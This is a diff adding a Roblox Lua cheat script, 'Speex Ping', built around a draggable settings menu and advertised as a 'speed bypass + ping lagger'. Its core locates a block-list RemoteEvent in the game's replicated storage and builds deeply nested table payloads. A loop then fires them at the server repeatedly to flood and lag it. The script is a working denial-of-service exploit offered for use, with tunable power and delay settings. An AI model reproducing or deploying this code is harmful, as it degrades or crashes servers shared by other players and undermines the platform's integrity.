@@ -1,0 +1,980 @@
+-- https://discord.gg/7Ar8QGZB2j
+
+if getgenv().SpeexPingLoaded then return end
+getgenv().SpeexPingLoaded = true
+
+local Players      = game:GetService("Players")
+local CoreGui      = game:GetService("CoreGui")
+local RunService   = game:GetService("RunService")
+local UIS          = game:GetService("UserInputService")
+local HttpService  = game:GetService("HttpService")
+local player       = Players.LocalPlayer
+
+local COL_BG      = Color3.fromRGB(228, 244, 252)
+local COL_BG_TOP  = Color3.fromRGB(240, 250, 255)
+local COL_ACCENT  = Color3.fromRGB(140, 214, 245)
+local COL_ACCENT2 = Color3.fromRGB(120, 205, 240)
+local COL_TEXT    = Color3.fromRGB(110, 170, 205)
+local COL_STROKE  = Color3.fromRGB(255, 255, 255)
+local COL_GREEN   = Color3.fromRGB(60, 200, 130)
+local COL_RED     = Color3.fromRGB(200, 90, 100)
+local COL_GREY    = Color3.fromRGB(180, 180, 180)
+
+local CONFIG_FILE = "SpeexPingLagger_Config.json"
+local DEFAULT_CFG = {
+    power        = 100000,
+    delay        = 0.125,
+    keybind      = "F",
+    autoBrainrot = true,
+}
+local cfg = {
+    power        = DEFAULT_CFG.power,
+    delay        = DEFAULT_CFG.delay,
+    keybind      = DEFAULT_CFG.keybind,
+    autoBrainrot = DEFAULT_CFG.autoBrainrot,
+}
+
+local function saveConfig()
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+    if ok and encoded and writefile then pcall(writefile, CONFIG_FILE, encoded) end
+end
+
+local function loadConfig()
+    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+    if not ok or type(data) ~= "table" then return end
+    cfg.power        = tonumber(data.power) or DEFAULT_CFG.power
+    cfg.delay        = tonumber(data.delay) or DEFAULT_CFG.delay
+    cfg.keybind      = type(data.keybind) == "string" and data.keybind or DEFAULT_CFG.keybind
+    cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
+end
+loadConfig()
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SpeexPingMenu"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 999
+local okParent = pcall(function()
+    if gethui then screenGui.Parent = gethui() else screenGui.Parent = CoreGui end
+end)
+if not okParent then screenGui.Parent = player:WaitForChild("PlayerGui") end
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "Main"
+mainFrame.Size = UDim2.new(0, 320, 0, 363)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -120)
+mainFrame.BackgroundColor3 = COL_BG
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Parent = screenGui
+
+local grad = Instance.new("UIGradient")
+grad.Rotation = 90
+grad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, COL_BG_TOP),
+    ColorSequenceKeypoint.new(1, COL_BG)
+}
+grad.Parent = mainFrame
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 18)
+corner.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = COL_STROKE
+stroke.Thickness = 2
+stroke.Transparency = 0.3
+stroke.Parent = mainFrame
+
+local dragging, dragStart, startPos = false, nil, nil
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+UIS.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+UIS.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+local uiScale = Instance.new("UIScale")
+uiScale.Scale = 0.5
+uiScale.Parent = mainFrame
+
+local function createLabel(text, size, pos, parent)
+    local label = Instance.new("TextLabel")
+    label.Size = size
+    label.Position = pos
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = COL_TEXT
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 18
+    label.Parent = parent
+    return label
+end
+
+local function createButton(text, pos, parent)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.8, 0, 0, 42)
+    btn.Position = pos
+    btn.BackgroundColor3 = COL_ACCENT
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 18
+    btn.BorderSizePixel = 0
+    btn.AutoButtonColor = false
+    btn.Parent = parent
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 10); c.Parent = btn
+    local g = Instance.new("UIGradient")
+    g.Rotation = 90
+    g.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(170, 226, 250)),
+        ColorSequenceKeypoint.new(1, COL_ACCENT2)
+    }
+    g.Parent = btn
+    return btn
+end
+
+local title = createLabel("SPEEX PING", UDim2.new(0, 130, 0, 26), UDim2.new(0, 18, 0, 12), mainFrame)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(100, 190, 230)
+
+local subtitle = createLabel("speed bypass + ping lagger", UDim2.new(1, -70, 0, 18), UDim2.new(0, 18, 0, 36), mainFrame)
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.TextSize = 12
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextColor3 = Color3.fromRGB(140, 195, 225)
+
+local hideBtn = createLabel("Hide", UDim2.new(0, 60, 0, 30), UDim2.new(1, -70, 0, 12), mainFrame)
+hideBtn.TextXAlignment = Enum.TextXAlignment.Right
+hideBtn.TextSize = 14
+hideBtn.Font = Enum.Font.Gotham
+
+local clickableHide = Instance.new("TextButton")
+clickableHide.Size = UDim2.new(0, 60, 0, 30)
+clickableHide.Position = UDim2.new(1, -70, 0, 12)
+clickableHide.BackgroundTransparency = 1
+clickableHide.Text = ""
+clickableHide.Parent = mainFrame
+
+local MIN_SCALE, MAX_SCALE, SCALE_STEP = 0.5, 1.5, 0.1
+local updateScaleUI
+
+local function createScaleBtn(text, x)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0, 24, 0, 24)
+    b.Position = UDim2.new(0, x, 0, 12)
+    b.BackgroundColor3 = COL_ACCENT
+    b.Text = text
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 16
+    b.BorderSizePixel = 0
+    b.AutoButtonColor = false
+    b.Parent = mainFrame
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = b
+    return b
+end
+
+local minusBtn = createScaleBtn("-", 150)
+local plusBtn  = createScaleBtn("+", 220)
+local scaleLabel = createLabel("100%", UDim2.new(0, 44, 0, 24), UDim2.new(0, 175, 0, 12), mainFrame)
+scaleLabel.TextSize = 13
+scaleLabel.Font = Enum.Font.Gotham
+
+local function changeScale(delta)
+    local newScale = math.clamp(uiScale.Scale + delta, MIN_SCALE, MAX_SCALE)
+    uiScale.Scale = newScale
+    scaleLabel.Text = math.floor(newScale * 100 + 0.5) .. "%"
+    if updateScaleUI then updateScaleUI(newScale) end
+end
+minusBtn.MouseButton1Click:Connect(function() changeScale(-SCALE_STEP) end)
+plusBtn.MouseButton1Click:Connect(function() changeScale(SCALE_STEP) end)
+
+local currentVersion = "v1"
+
+local versionLabel = createLabel("Version:", UDim2.new(0, 60, 0, 22), UDim2.new(0, 18, 0, 60), mainFrame)
+versionLabel.TextSize = 13
+versionLabel.Font = Enum.Font.Gotham
+versionLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local function createVersionBtn(text, x)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0, 52, 0, 24)
+    b.Position = UDim2.new(0, x, 0, 58)
+    b.BackgroundColor3 = COL_ACCENT
+    b.Text = text
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 14
+    b.BorderSizePixel = 0
+    b.AutoButtonColor = false
+    b.Parent = mainFrame
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = b
+    return b
+end
+
+local v1Btn = createVersionBtn("V1", 80)
+local v2Btn = createVersionBtn("V2", 140)
+
+local function applyVersionUI()
+    if currentVersion == "v1" then
+        v1Btn.BackgroundColor3 = COL_GREEN
+        v2Btn.BackgroundColor3 = COL_ACCENT
+    else
+        v1Btn.BackgroundColor3 = COL_ACCENT
+        v2Btn.BackgroundColor3 = COL_GREEN
+    end
+end
+applyVersionUI()
+
+local profileCard = Instance.new("Frame")
+profileCard.Size = UDim2.new(0.84, 0, 0, 68)
+profileCard.Position = UDim2.new(0.08, 0, 0, 90)
+profileCard.BackgroundColor3 = COL_ACCENT
+profileCard.BackgroundTransparency = 0.55
+profileCard.BorderSizePixel = 0
+profileCard.Parent = mainFrame
+local pcCorner = Instance.new("UICorner"); pcCorner.CornerRadius = UDim.new(0, 12); pcCorner.Parent = profileCard
+
+local avatar = Instance.new("ImageLabel")
+avatar.Size = UDim2.new(0, 52, 0, 52)
+avatar.Position = UDim2.new(0, 8, 0.5, -26)
+avatar.BackgroundColor3 = COL_BG_TOP
+avatar.BorderSizePixel = 0
+avatar.Parent = profileCard
+local avCorner = Instance.new("UICorner"); avCorner.CornerRadius = UDim.new(1, 0); avCorner.Parent = avatar
+local avStroke = Instance.new("UIStroke")
+avStroke.Color = Color3.fromRGB(255, 255, 255)
+avStroke.Thickness = 2
+avStroke.Transparency = 0.2
+avStroke.Parent = avatar
+
+task.spawn(function()
+    local ok, img = pcall(function()
+        return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+    end)
+    if ok and img then avatar.Image = img end
+end)
+
+local nameLabel = Instance.new("TextLabel")
+nameLabel.Size = UDim2.new(1, -76, 0, 24)
+nameLabel.Position = UDim2.new(0, 68, 0, 8)
+nameLabel.BackgroundTransparency = 1
+nameLabel.Text = string.upper(player.DisplayName)
+nameLabel.TextColor3 = Color3.fromRGB(70, 130, 170)
+nameLabel.Font = Enum.Font.GothamBold
+nameLabel.TextSize = 17
+nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
+nameLabel.Parent = profileCard
+
+local subLabel = Instance.new("TextLabel")
+subLabel.Size = UDim2.new(1, -76, 0, 20)
+subLabel.Position = UDim2.new(0, 68, 0, 36)
+subLabel.BackgroundTransparency = 1
+subLabel.Text = "@" .. player.Name .. "  ·  ID: " .. player.UserId
+subLabel.TextColor3 = Color3.fromRGB(110, 165, 200)
+subLabel.Font = Enum.Font.Gotham
+subLabel.TextSize = 12
+subLabel.TextXAlignment = Enum.TextXAlignment.Left
+subLabel.TextTruncate = Enum.TextTruncate.AtEnd
+subLabel.Parent = profileCard
+
+local discordLabel = Instance.new("TextLabel")
+discordLabel.Size = UDim2.new(0.84, 0, 0, 22)
+discordLabel.Position = UDim2.new(0.08, 0, 0, 326)
+discordLabel.BackgroundTransparency = 1
+discordLabel.Text = "discord.gg/59uQ22PeK"
+discordLabel.TextColor3 = Color3.fromRGB(90, 150, 195)
+discordLabel.Font = Enum.Font.GothamBold
+discordLabel.TextSize = 13
+discordLabel.Parent = mainFrame
+
+local discordLine = Instance.new("Frame")
+discordLine.Size = UDim2.new(0, 150, 0, 2)
+discordLine.Position = UDim2.new(0.5, -75, 0, 352)
+discordLine.BackgroundColor3 = COL_ACCENT
+discordLine.BorderSizePixel = 0
+discordLine.Parent = mainFrame
+local dlCorner = Instance.new("UICorner"); dlCorner.CornerRadius = UDim.new(0, 2); dlCorner.Parent = discordLine
+
+local changeGuiBtn = createButton("Change GUI", UDim2.new(0.1, 0, 0, 178), mainFrame)
+local statusBtn = createButton("DISABLED", UDim2.new(0.1, 0, 0, 238), mainFrame)
+
+local popup = Instance.new("Frame")
+popup.Size = UDim2.new(0, 260, 0, 330)
+popup.Position = UDim2.new(0.5, -130, 0.5, -140)
+popup.BackgroundColor3 = COL_BG
+popup.BorderSizePixel = 0
+popup.Visible = false
+popup.Active = true
+popup.Parent = screenGui
+
+local popupScale = Instance.new("UIScale")
+popupScale.Scale = 0.5
+popupScale.Parent = popup
+
+local pDragging, pDragStart, pStartPos = false, nil, nil
+popup.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        pDragging = true
+        pDragStart = input.Position
+        pStartPos = popup.Position
+    end
+end)
+UIS.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        pDragging = false
+    end
+end)
+UIS.InputChanged:Connect(function(input)
+    if pDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - pDragStart
+        popup.Position = UDim2.new(
+            pStartPos.X.Scale, pStartPos.X.Offset + delta.X,
+            pStartPos.Y.Scale, pStartPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+local popupGrad = Instance.new("UIGradient")
+popupGrad.Rotation = 90
+popupGrad.Color = grad.Color
+popupGrad.Parent = popup
+
+local popupCorner = Instance.new("UICorner")
+popupCorner.CornerRadius = UDim.new(0, 18)
+popupCorner.Parent = popup
+
+local popupStroke = Instance.new("UIStroke")
+popupStroke.Color = COL_STROKE
+popupStroke.Thickness = 2
+popupStroke.Transparency = 0.3
+popupStroke.Parent = popup
+
+local popupTitle = createLabel("Change GUI", UDim2.new(1, -50, 0, 30), UDim2.new(0, 16, 0, 12), popup)
+popupTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 28, 0, 28)
+closeBtn.Position = UDim2.new(1, -38, 0, 10)
+closeBtn.BackgroundTransparency = 1
+closeBtn.Text = "X"
+closeBtn.TextColor3 = COL_TEXT
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 16
+closeBtn.Parent = popup
+closeBtn.MouseButton1Click:Connect(function() popup.Visible = false end)
+
+local sizeLabel = createLabel("GUI Size:", UDim2.new(0.55, 0, 0, 24), UDim2.new(0, 16, 0, 55), popup)
+sizeLabel.TextXAlignment = Enum.TextXAlignment.Left
+sizeLabel.TextSize = 14
+sizeLabel.Font = Enum.Font.Gotham
+
+local sizeValueLabel = createLabel("0.5x", UDim2.new(0, 60, 0, 24), UDim2.new(1, -76, 0, 55), popup)
+sizeValueLabel.TextXAlignment = Enum.TextXAlignment.Right
+sizeValueLabel.TextSize = 14
+sizeValueLabel.Font = Enum.Font.Gotham
+
+local TRACK_W = 228
+local track = Instance.new("Frame")
+track.Size = UDim2.new(0, TRACK_W, 0, 8)
+track.Position = UDim2.new(0, 16, 0, 90)
+track.BackgroundColor3 = COL_BG_TOP
+track.BorderSizePixel = 0
+track.Parent = popup
+local trackCorner = Instance.new("UICorner"); trackCorner.CornerRadius = UDim.new(0, 4); trackCorner.Parent = track
+
+local knob = Instance.new("Frame")
+knob.Size = UDim2.new(0, 18, 0, 18)
+knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+knob.BorderSizePixel = 0
+knob.Parent = track
+local knobCorner = Instance.new("UICorner"); knobCorner.CornerRadius = UDim.new(1, 0); knobCorner.Parent = knob
+local knobStroke = Instance.new("UIStroke")
+knobStroke.Color = COL_ACCENT2
+knobStroke.Thickness = 2
+knobStroke.Parent = knob
+
+updateScaleUI = function(s)
+    local t = (s - MIN_SCALE) / (MAX_SCALE - MIN_SCALE)
+    knob.Position = UDim2.new(0, t * (TRACK_W - 18), 0.5, -9)
+    scaleLabel.Text = math.floor(s * 100 + 0.5) .. "%"
+    sizeValueLabel.Text = string.format("%.1fx", s)
+    popupScale.Scale = s
+end
+
+local draggingSlider = false
+local function setScaleFromInput(input)
+    local x = input.Position.X - track.AbsolutePosition.X
+    local t = math.clamp(x / (TRACK_W - 18), 0, 1)
+    local s = MIN_SCALE + t * (MAX_SCALE - MIN_SCALE)
+    uiScale.Scale = s
+    popupScale.Scale = s
+    updateScaleUI(s)
+end
+
+track.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingSlider = true
+        setScaleFromInput(input)
+    end
+end)
+UIS.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingSlider = false
+    end
+end)
+UIS.InputChanged:Connect(function(input)
+    if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        setScaleFromInput(input)
+    end
+end)
+
+updateScaleUI(uiScale.Scale)
+
+local v1PopupContent = {}
+local v2PopupContent = {}
+
+local function createRowGeneric(labelText, valueText, y, contentTable)
+    local l = createLabel(labelText, UDim2.new(0.55, 0, 0, 26), UDim2.new(0, 16, 0, y), popup)
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.TextSize = 14
+    l.Font = Enum.Font.Gotham
+    table.insert(contentTable, l)
+
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(0, 110, 0, 26)
+    box.Position = UDim2.new(1, -126, 0, y)
+    box.BackgroundColor3 = COL_BG_TOP
+    box.Text = valueText
+    box.TextColor3 = COL_TEXT
+    box.Font = Enum.Font.GothamBold
+    box.TextSize = 14
+    box.BorderSizePixel = 0
+    box.ClearTextOnFocus = false
+    box.Parent = popup
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = box
+    table.insert(contentTable, box)
+    return box
+end
+
+local powerBox   = createRowGeneric("Power:", "100000", 120, v1PopupContent)
+local delayBox   = createRowGeneric("Delay (secs):", "0.125", 155, v1PopupContent)
+local keybindBox = createRowGeneric("Keybind:", "F", 190, v1PopupContent)
+
+local speedEnabled = false
+local speedToggle = Instance.new("TextButton")
+speedToggle.Size = UDim2.new(0, 62, 0, 26)
+speedToggle.Position = UDim2.new(1, -78, 0, 225)
+speedToggle.BackgroundColor3 = COL_RED
+speedToggle.Text = "OFF"
+speedToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+speedToggle.Font = Enum.Font.GothamBold
+speedToggle.TextSize = 14
+speedToggle.BorderSizePixel = 0
+speedToggle.AutoButtonColor = false
+speedToggle.Parent = popup
+local stCorner = Instance.new("UICorner"); stCorner.CornerRadius = UDim.new(0, 8); stCorner.Parent = speedToggle
+table.insert(v1PopupContent, speedToggle)
+
+local speedLabel = createLabel("Speed:", UDim2.new(0.55, 0, 0, 26), UDim2.new(0, 16, 0, 225), popup)
+speedLabel.TextXAlignment = Enum.TextXAlignment.Left
+speedLabel.TextSize = 14
+speedLabel.Font = Enum.Font.Gotham
+table.insert(v1PopupContent, speedLabel)
+
+local speedBox = Instance.new("TextBox")
+speedBox.Size = UDim2.new(0, 60, 0, 26)
+speedBox.Position = UDim2.new(1, -148, 0, 225)
+speedBox.BackgroundColor3 = COL_BG_TOP
+speedBox.Text = "49"
+speedBox.TextColor3 = COL_TEXT
+speedBox.Font = Enum.Font.GothamBold
+speedBox.TextSize = 14
+speedBox.BorderSizePixel = 0
+speedBox.ClearTextOnFocus = false
+speedBox.Parent = popup
+local sbCorner = Instance.new("UICorner"); sbCorner.CornerRadius = UDim.new(0, 8); sbCorner.Parent = speedBox
+table.insert(v1PopupContent, speedBox)
+
+speedToggle.MouseButton1Click:Connect(function()
+    speedEnabled = not speedEnabled
+    speedToggle.Text = speedEnabled and "ON" or "OFF"
+    speedToggle.BackgroundColor3 = speedEnabled and COL_GREEN or COL_RED
+end)
+
+local autoBrainrot = false
+local abLabel = createLabel("Auto Brainrot:", UDim2.new(0.55, 0, 0, 26), UDim2.new(0, 16, 0, 260), popup)
+abLabel.TextXAlignment = Enum.TextXAlignment.Left
+abLabel.TextSize = 14
+abLabel.Font = Enum.Font.Gotham
+table.insert(v1PopupContent, abLabel)
+
+local abToggle = Instance.new("TextButton")
+abToggle.Size = UDim2.new(0, 62, 0, 26)
+abToggle.Position = UDim2.new(1, -78, 0, 260)
+abToggle.BackgroundColor3 = COL_RED
+abToggle.Text = "OFF"
+abToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+abToggle.Font = Enum.Font.GothamBold
+abToggle.TextSize = 14
+abToggle.BorderSizePixel = 0
+abToggle.AutoButtonColor = false
+abToggle.Parent = popup
+local abCorner = Instance.new("UICorner"); abCorner.CornerRadius = UDim.new(0, 8); abCorner.Parent = abToggle
+table.insert(v1PopupContent, abToggle)
+
+abToggle.MouseButton1Click:Connect(function()
+    autoBrainrot = not autoBrainrot
+    abToggle.Text = autoBrainrot and "ON" or "OFF"
+    abToggle.BackgroundColor3 = autoBrainrot and COL_GREEN or COL_RED
+end)
+
+local v2PowerBox = createRowGeneric("Power:", tostring(cfg.power), 120, v2PopupContent)
+v2PowerBox.PlaceholderText = "100000"
+v2PowerBox.FocusLost:Connect(function()
+    local num = tonumber(v2PowerBox.Text)
+    if num and num >= 1 then cfg.power = math.floor(num) saveConfig() end
+    v2PowerBox.Text = tostring(cfg.power)
+end)
+
+local v2DelayBox = createRowGeneric("Delay (secs):", string.format("%.3f", cfg.delay), 155, v2PopupContent)
+v2DelayBox.PlaceholderText = "0.125"
+v2DelayBox.FocusLost:Connect(function()
+    local num = tonumber(v2DelayBox.Text)
+    if num and num >= 0.01 then cfg.delay = num saveConfig() end
+    v2DelayBox.Text = string.format("%.3f", cfg.delay)
+end)
+
+local v2KeybindBox = createRowGeneric("Keybind:", cfg.keybind, 190, v2PopupContent)
+v2KeybindBox.FocusLost:Connect(function()
+    local txt = v2KeybindBox.Text:upper()
+    local ok, kc = pcall(function() return Enum.KeyCode[txt] end)
+    if ok and kc then cfg.keybind = txt saveConfig() end
+    v2KeybindBox.Text = cfg.keybind
+end)
+
+local v2AutoBrainrotLabel = createLabel("Auto Brainrot:", UDim2.new(0.55, 0, 0, 26), UDim2.new(0, 16, 0, 225), popup)
+v2AutoBrainrotLabel.TextXAlignment = Enum.TextXAlignment.Left
+v2AutoBrainrotLabel.TextSize = 14
+v2AutoBrainrotLabel.Font = Enum.Font.Gotham
+table.insert(v2PopupContent, v2AutoBrainrotLabel)
+
+local v2AbToggle = Instance.new("TextButton")
+v2AbToggle.Size = UDim2.new(0, 62, 0, 26)
+v2AbToggle.Position = UDim2.new(1, -78, 0, 225)
+v2AbToggle.BackgroundColor3 = cfg.autoBrainrot and COL_GREEN or COL_RED
+v2AbToggle.Text = cfg.autoBrainrot and "ON" or "OFF"
+v2AbToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+v2AbToggle.Font = Enum.Font.GothamBold
+v2AbToggle.TextSize = 14
+v2AbToggle.BorderSizePixel = 0
+v2AbToggle.AutoButtonColor = false
+v2AbToggle.Parent = popup
+local v2AbCorner = Instance.new("UICorner"); v2AbCorner.CornerRadius = UDim.new(0, 8); v2AbCorner.Parent = v2AbToggle
+table.insert(v2PopupContent, v2AbToggle)
+
+v2AbToggle.MouseButton1Click:Connect(function()
+    cfg.autoBrainrot = not cfg.autoBrainrot
+    v2AbToggle.Text = cfg.autoBrainrot and "ON" or "OFF"
+    v2AbToggle.BackgroundColor3 = cfg.autoBrainrot and COL_GREEN or COL_RED
+    saveConfig()
+    if not cfg.autoBrainrot then
+        v2BrainrotMode = false
+        v2LastBrainrotState = false
+    end
+end)
+
+local function applyPopupVersionUI()
+    local showV1 = (currentVersion == "v1")
+    for _, el in ipairs(v1PopupContent) do
+        if el and el.Parent then el.Visible = showV1 end
+    end
+    for _, el in ipairs(v2PopupContent) do
+        if el and el.Parent then el.Visible = not showV1 end
+    end
+    popupTitle.Text = showV1 and "Change GUI · V1" or "Change GUI · V2 Ping"
+end
+applyPopupVersionUI()
+
+local miniStatusBtn = Instance.new("TextButton")
+miniStatusBtn.Size = UDim2.new(0.84, 0, 0, 32)
+miniStatusBtn.Position = UDim2.new(0.08, 0, 0, 56)
+miniStatusBtn.BackgroundColor3 = COL_ACCENT
+miniStatusBtn.Text = "DISABLE"
+miniStatusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+miniStatusBtn.Font = Enum.Font.GothamBold
+miniStatusBtn.TextSize = 15
+miniStatusBtn.BorderSizePixel = 0
+miniStatusBtn.AutoButtonColor = false
+miniStatusBtn.Visible = false
+miniStatusBtn.Parent = mainFrame
+local miniCorner = Instance.new("UICorner"); miniCorner.CornerRadius = UDim.new(0, 8); miniCorner.Parent = miniStatusBtn
+local miniGrad = Instance.new("UIGradient")
+miniGrad.Rotation = 90
+miniGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(170, 226, 250)),
+    ColorSequenceKeypoint.new(1, COL_ACCENT2)
+}
+miniGrad.Parent = miniStatusBtn
+
+local remote = nil
+
+local function findRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
+        local found = rrs:FindFirstChild(name)
+        if found and found:IsA("RemoteEvent") then return found end
+    end
+    for _, c in ipairs(rrs:GetChildren()) do
+        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
+    end
+    return nil
+end
+
+remote = findRemote()
+
+local function buildPayload(power)
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, 186 do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(power / 188), 10000)
+    for _ = 1, maxRep do
+        table.insert(main, nested)
+    end
+    return main
+end
+
+local enabled = false
+
+local function runPingLoop()
+    local delay = tonumber(delayBox.Text) or 0.125
+    while enabled and remote and currentVersion == "v1" do
+        local power = tonumber(powerBox.Text) or 100000
+        local payload = buildPayload(power)
+        local ok = pcall(function() remote:FireServer(payload) end)
+        if not ok then delay = math.min(delay * 1.5, 0.5)
+        else delay = math.max(delay * 0.995, 0.05) end
+        local nd = tonumber(delayBox.Text)
+        if nd and nd > 0 then delay = math.max(nd, 0.01) end
+        task.wait(delay)
+    end
+end
+
+local function setEnabled(state)
+    enabled = state
+    if enabled then
+        if not remote then remote = findRemote() end
+        if not remote then
+            enabled = false
+            statusBtn.Text = "NO REMOTE"
+            statusBtn.BackgroundColor3 = COL_RED
+            return
+        end
+        statusBtn.Text = "ENABLED"
+        statusBtn.BackgroundColor3 = COL_GREEN
+        miniStatusBtn.Text = "ENABLE"
+        miniStatusBtn.BackgroundColor3 = COL_GREEN
+        miniGrad.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 225, 165)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 185, 115))
+        }
+        task.spawn(runPingLoop)
+    else
+        statusBtn.Text = "DISABLED"
+        statusBtn.BackgroundColor3 = COL_ACCENT
+        miniStatusBtn.Text = "DISABLE"
+        miniStatusBtn.BackgroundColor3 = COL_ACCENT
+        miniGrad.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(170, 226, 250)),
+            ColorSequenceKeypoint.new(1, COL_ACCENT2)
+        }
+    end
+end
+
+local v2Enabled = false
+local v2BrainrotMode = false
+local v2LastBrainrotState = false
+
+local function v2RunPingLoop()
+    while v2Enabled and currentVersion == "v2" do
+        if not remote then remote = findRemote() end
+        if not remote then
+            v2Enabled = false
+            statusBtn.Text = "NO REMOTE"
+            statusBtn.BackgroundColor3 = COL_RED
+            break
+        end
+        local power = tonumber(v2PowerBox.Text) or cfg.power
+        local delay = tonumber(v2DelayBox.Text) or cfg.delay
+        local payload = buildPayload(power)
+        local ok = pcall(function() remote:FireServer(payload) end)
+        if not ok then delay = math.min(delay * 1.5, 0.5) end
+        task.wait(math.max(delay, 0.01))
+    end
+end
+
+local function v2SetActive(state)
+    v2Enabled = state
+    if state then
+        if not remote then remote = findRemote() end
+        if not remote then
+            v2Enabled = false
+            statusBtn.Text = "NO REMOTE"
+            statusBtn.BackgroundColor3 = COL_RED
+            return
+        end
+        statusBtn.Text = "DEACTIVATE"
+        statusBtn.BackgroundColor3 = COL_GREEN
+        miniStatusBtn.Text = "DEACTIVATE"
+        miniStatusBtn.BackgroundColor3 = COL_GREEN
+        miniGrad.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 225, 165)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 185, 115))
+        }
+        task.spawn(v2RunPingLoop)
+    else
+        statusBtn.Text = "ACTIVATE"
+        statusBtn.BackgroundColor3 = COL_ACCENT
+        miniStatusBtn.Text = "ACTIVATE"
+        miniStatusBtn.BackgroundColor3 = COL_ACCENT
+        miniGrad.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(170, 226, 250)),
+            ColorSequenceKeypoint.new(1, COL_ACCENT2)
+        }
+    end
+end
+
+statusBtn.MouseButton1Click:Connect(function()
+    if currentVersion == "v1" then
+        setEnabled(not enabled)
+    else
+        v2SetActive(not v2Enabled)
+    end
+end)
+
